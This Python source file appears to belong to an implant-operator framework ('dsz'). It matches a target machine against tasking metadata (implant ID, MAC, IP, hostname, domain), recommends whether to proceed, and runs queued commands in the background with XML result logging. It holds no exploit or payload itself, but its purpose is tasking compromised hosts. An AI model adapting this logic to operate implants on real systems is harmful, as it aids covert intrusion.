
import dsz
import dsz.menu
import os
import re
import xml.dom.minidom
import tasking
MaximumTasks = 'MaximumTasks'
HostName = 'HostName'
Domain = 'Domain'
IpAddress = 'IpAddress'
Mac = 'Mac'
PcId = 'PcId'
Guid = 'Guid'
SuccessfulMatch = 0
QuestionableMatch = 1
NoMatch = 2

class Tasking(object, ):

    def __init__(self, name, metadata):
        self.bRan = False
        self.name = name
        self.id = list()
        self.mac = list()
        self.ip = list()
        self.hostname = list()
        self.domain = list()
        self.guid = list()
        self.tasks = list()
        self.runningTasks = list()
        self.Recommendation = None
        f = open(metadata, 'r')
        try:
            for line in f:
                line = line.strip()
                m = re.match('Implant ID: +(.*)', line)
                if m:
                    self.id += [x.strip() for x in m.group(1).split(', ')]
                m = re.match('MAC: +(.*)', line)
                if m:
                    self.mac += [unicode(x.strip(), 'utf_8') for x in m.group(1).split(', ')]
                m = re.match('IP: +(.*)', line)
                if m:
                    self.ip += [unicode(x.strip(), 'utf_8') for x in m.group(1).split(', ')]
                m = re.match('Hostname: +(.*)', line)
                if m:
                    self.hostname += [unicode(x.strip(), 'utf_8') for x in m.group(1).split(', ')]
                m = re.match('Domain: +(.*)', line)
                if m:
                    self.domain += [unicode(x.strip(), 'utf_8') for x in m.group(1).split(', ')]
        finally:
            f.close()
        temp = list()
        for ip in self.ip:
            while ('%%' in ip):
                ip = ip.replace('%%', '%')
            temp.append(ip)
        self.ip = temp
        pass

    def Dump(self):
        dsz.ui.Echo('---------------------------------------------')
        dsz.ui.Echo(('Tasking for %s' % self.name))
        for id in self.id:
            dsz.ui.Echo(('ID:  %s' % id))
        for mac in self.mac:
            dsz.ui.Echo(('MAC: %s' % mac))
        for ip in self.ip:
            dsz.ui.Echo(('IP:  %s' % ip))
        dsz.ui.Echo(('Host:%s' % self.hostname))
        dsz.ui.Echo(('Dom: %s' % self.domain))
        for task in self.tasks:
            task.Display()
        dsz.ui.Echo('---------------------------------------------')

    def EvaluateThisTarget(self, info, bDisplay=False):
        self.PcMatch = compareData('PC Ids', set([long(x, 16) for x in self.id]), set([long(x, 16) for x in info[PcId]]), '0x%016x', align='', bDisplay=bDisplay)
        self.MacMatch = compareData('Mac', set([x.upper() for x in self.mac]), set([x.upper() for x in info[Mac]]), bDisplay=bDisplay)
        self.IpMatch = compareData('Ip Addresses', set([x.upper() for x in self.ip]), set([x.upper() for x in info[IpAddress]]), bDisplay=bDisplay)
        self.HostNameMatch = compareData('HostName', set([x.upper() for x in self.hostname]), set([x.upper() for x in info[HostName]]), bDisplay=bDisplay)
        self.DomainMatch = compareData('Domain', set([x.upper() for x in self.domain]), set([x.upper() for x in info[Domain]]), bDisplay=bDisplay)
        self.GuidMatch = compareData('GUID', set([x.upper() for x in self.guid]), set([x.upper() for x in info[Guid]]), bDisplay=bDisplay)
        self.Recommendation = makeRecommendation(self.PcMatch, self.MacMatch, self.IpMatch, self.HostNameMatch, self.DomainMatch, self.GuidMatch, self, info)

    def DisplayMatchAndConsiderStart(self, info, bAutomated, bForce=False):
        dsz.ui.Echo(printLine('-', 80))
        dsz.ui.Echo(printHeader('Tasking Match Information', 80))
        dsz.ui.Echo(printLine('-', 80))
        if ((self.Recommendation == None) or bForce):
            self.EvaluateThisTarget(info, bDisplay=True)
        resultList = [displayResult('PC Id', self.PcMatch, 'Definately Match', 'Suspicious match', 'No Match'), displayResult('MAC', self.MacMatch, 'Match', 'Match', 'No Match', PartialType=dsz.GOOD), displayResult('IP', self.IpMatch, 'Match', 'Match', 'No Match', PartialType=dsz.GOOD), displayResult('HostName', self.HostNameMatch, 'Match', 'Suspicious match', 'No Match'), displayResult('Domain', self.DomainMatch, 'Match', 'Suspicious match', 'No Match'), displayResult('Guid', self.GuidMatch, 'Match', 'Match', 'No Match', PartialType=dsz.GOOD), displayResult('Recommendation', self.Recommendation, 'Go ahead', 'Consider carefully', 'Skip')]
        space = max([len(x[0]) for x in resultList])
        for result in resultList:
            format = ('%%%ds : %%s' % space)
            dsz.ui.Echo((format % (result[0], result[1])), result[2])
        if bAutomated:
            if (self.Recommendation == SuccessfulMatch):
                return True
            if (self.Recommendation == NoMatch):
                return False
        if (self.Recommendation == SuccessfulMatch):
            defaultAnswer = True
        else:
            defaultAnswer = False
        return dsz.ui.Prompt('Do you want to proceed with this tasking?', defaultAnswer)

    def DoTasking(self):
        self.bRan = True
        delayed = list()
        for task in sorted(self.tasks, key=(lambda task: int(task.Priority))):
            dsz.ui.Echo(('Preprocessing for %s task' % task.name))
            task.Preprocessing()
            dsz.ui.Echo('    DONE', dsz.GOOD)
            if task.IsSkip():
                continue
            if task.IsVerify():
                if (not queryExecuteTask(delayed, task)):
                    continue
            self.StartCommand(task)
        self.AreAnyCommandsRunning()
        if (len(delayed) > 0):
            dsz.ui.Echo(('You delayed execution of %d tasks.' % len(delayed)))
            if dsz.ui.Prompt('Do you want to try to run them now?'):
                self.tasks = delayed
                self.DoTasking()

    def StartCommand(self, task):
        cmds = task.CreateCommandLine()
        cmdData = list()
        for cmd in cmds:
            self.CanStartCommand()
            dsz.ui.Echo(('Starting task:  %s' % cmd))
            if dsz.cmd.Run(('task=%s background %s' % (task.TaskID, cmd))):
                dsz.ui.Echo('    STARTED', dsz.GOOD)
                self.runningTasks.append(dsz.cmd.LastId())
                cmdData.append((cmd, dsz.cmd.LastId()))
            else:
                dsz.ui.Echo('    FAILED (Unable to create tasking!)', dsz.ERROR)
        RecordTask(task, cmdData)

    def CanStartCommand(self):
        while (self._currentNumberOfRunningCommands() >= dsz.script.Env[tasking.MaximumTasks]):
            delay = 5
            dsz.ui.Echo(('No room to start commands.  Sleeping for %d seconds.' % delay))
            dsz.Sleep((delay * 1000))
            dsz.ui.Echo('    SLEPT', dsz.GOOD)
        return True

    def AreAnyCommandsRunning(self):
        while (self._currentNumberOfRunningCommands() > 0):
            delay = 5
            dsz.ui.Echo(('Waiting for the completion of running tasks.  Sleeping for %d seconds.' % delay))
            dsz.Sleep((delay * 1000))
            dsz.ui.Echo('    SLEPT', dsz.GOOD)
        return True

    def _currentNumberOfRunningCommands(self):
        count = 0
        dsz.ui.Echo('Counting running tasks')
        for t in self.runningTasks:
            if (not dsz.cmd.data.Get('CommandMetaData::IsRunning', dsz.TYPE_BOOL, t)[0]):
                self.runningTasks.remove(t)
            else:
                count = (count + 1)
        dsz.ui.Echo(('    %d tasks running' % count), dsz.WARNING)
        return count

    def __str__(self):
        match = 'Uncertain Match'
        if (self.Recommendation == SuccessfulMatch):
            match = 'Probable Match'
        elif (self.Recommendation == NoMatch):
            match = 'Not A Match'
        state = ''
        if self.bRan:
            state = '(Already Ran)'
        return ('%s: %s %s' % (self.name, match, state))

def RecordTask(task, cmdData):
    resultsDir = ('%s/TaskResults' % dsz.script.Env['log_path'])
    try:
        os.mkdir(resultsDir)
    except:
        pass
    outputFile = ('%s/%s_%s_%s.xml' % (resultsDir, task.Priority, task.name, dsz.Timestamp()))
    doc = xml.dom.minidom.Document()
    results = doc.createElement('TaskResults')
    doc.appendChild(results)
    results.setAttribute('taskID', task.TaskID)
    results.setAttribute('targetID', task.TargetID)
    commands = doc.createElement('Commands')
    results.appendChild(commands)
    commands.setAttribute('tool', 'DSZ')
    for (cmd, id) in cmdData:
        command = doc.createElement('Command')
        commands.appendChild(command)
        type = doc.createElement('Type')
        command.appendChild(type)
        type.appendChild(doc.createTextNode(cmd))
        location = doc.createElement('DSZPayloadLocation')
        command.appendChild(location)
        location.appendChild(doc.createTextNode(dsz.cmd.data.Get('CommandMetaData::XmlLog', dsz.TYPE_STRING, id)[0]))
        taskId = doc.createElement('TaskId')
        command.appendChild(taskId)
        taskId.appendChild(doc.createTextNode(dsz.cmd.data.Get('CommandMetaData::TaskId', dsz.TYPE_STRING, id)[0]))
    output = open(outputFile, 'w')
    try:
        output.write(doc.toprettyxml(indent='  '))
    finally:
        output.close()

def queryExecuteTask(delayedQueue, task):
    task.Display()
    (text, selected) = dsz.menu.ExecuteSimpleMenu('Do you wish to execute this task?', ['Yes, execute the task', 'No, but ask me again after doing other tasks', 'No, do not execute the task at all'])
    if (selected == (-1)):
        exit((-1))
    elif (selected == 0):
        return True
    elif (selected == 1):
        delayedQueue.append(task)
    return False

def makeRecommendation(PcMatch, MacMatch, IpMatch, HostNameMatch, DomainMatch, GuidMatch, TaskingInfo, HostInfo):
    if (PcMatch == SuccessfulMatch):
        return SuccessfulMatch
    if ((PcMatch == NoMatch) and (len(HostInfo[PcId]) > 0) and len(TaskingInfo.id)):
        return NoMatch
    if (MacMatch in [SuccessfulMatch, QuestionableMatch]):
        return SuccessfulMatch
    if (GuidMatch in [SuccessfulMatch, QuestionableMatch]):
        return SuccessfulMatch
    if (IpMatch == SuccessfulMatch):
        return SuccessfulMatch
    if ((HostNameMatch == SuccessfulMatch) and (DomainMatch == SuccessfulMatch)):
        return SuccessfulMatch
    if ((PcMatch == QuestionableMatch) or (IpMatch == QuestionableMatch) or (HostNameMatch == QuestionableMatch) or (DomainMatch == QuestionableMatch)):
        return QuestionableMatch
    return NoMatch

def displayResult(name, result, Full, Partial, NoMatch, FullType=dsz.GOOD, PartialType=dsz.WARNING, NoMatchType=dsz.ERROR):
    if (result == SuccessfulMatch):
        return (name, Full, FullType)
    elif (result == QuestionableMatch):
        return (name, Partial, PartialType)
    else:
        return (name, NoMatch, NoMatchType)

def compareData(name, tasking, local, format='%s', align='-', bDisplay=False):
    matches = (tasking & local)
    task = list((tasking - matches))
    loc = list((local - matches))
    if bDisplay:
        maxSize = max(15, max([len((format % x)) for x in ((tasking | local) | set([0]))]))
        lineFormat = ('%%%s%ds    %%%s%ds' % (align, maxSize, align, maxSize))
        dsz.ui.Echo(printHeader(name, ((2 * maxSize) + 4)), dsz.WARNING)
        dsz.ui.Echo((lineFormat % (printHeader('Tasking', maxSize), printHeader('Target', maxSize))), dsz.WARNING)
        dsz.ui.Echo(printLine('-', ((2 * maxSize) + 4)))
        matches = (tasking & local)
        for item in matches:
            dsz.ui.Echo((lineFormat % ((format % item), (format % item))), dsz.GOOD)
        task = list((tasking - matches))
        loc = list((local - matches))
        for i in range(0, max(len(task), len(loc))):
            left = ''
            right = ''
            if (i < len(task)):
                left = (format % task[i])
            if (i < len(loc)):
                right = (format % loc[i])
            dsz.ui.Echo((lineFormat % (left, right)))
        dsz.ui.Echo('')
    if ((len(matches) > 0) and (len(loc) > 0)):
        return QuestionableMatch
    elif (len(matches) > 0):
        return SuccessfulMatch
    else:
        return NoMatch

def printHeader(string, size):
    while (len(string) < (size - 1)):
        string = (' %s ' % string)
    return string

def printLine(ch, size):
    str = ''
    for i in range(0, size):
        str = ('%s%s' % (str, ch))
    return str